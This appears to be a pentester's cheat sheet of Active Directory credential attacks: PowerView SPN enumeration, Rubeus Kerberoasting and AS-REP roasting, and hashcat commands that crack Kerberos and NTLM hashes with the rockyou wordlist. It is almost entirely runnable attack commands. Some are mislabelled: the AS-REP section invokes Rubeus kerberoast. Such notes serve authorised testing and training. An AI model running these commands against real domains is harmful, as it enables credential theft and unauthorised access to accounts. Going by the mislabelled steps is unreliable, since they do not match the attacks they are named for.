
hashcat64.exe --help | find "NTLM"
### Kerberoasting 
```
PowerShell Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName

Rubeus kerberoast /outfile:hashes.asreproast


hashcat64.exe -a 0 -m 13100 C:\Users\NyaMeeEain\hashes.asreproast C:\Users\NyaMeeEain\Data\rockyou.txt -o winpass2.txt --force  --potfile-disable
```

### ASREPRoasting
 
```
Rubeus kerberoast format:hashcat /outfile:hashes.asreproast



hashcat64.exe -a 0 -m 18200 C:\Users\NyaMeeEain\hashes.asreproast C:\Users\NyaMeeEain\Data\rockyou.txt --force  --potfile-disable


```
### NTLM
```
Wordlist          | hashcat -a 0 -m 400 example400.hash example.dict
Brute-Force       | hashcat -a 3 -m 0 example0.hash ?a?a?a?a?a?a

hashcat64.exe -a 0 -m 1000 C:\Users\NyaMeeEain\Desktop\ntlm.txt rockyou.txt
```
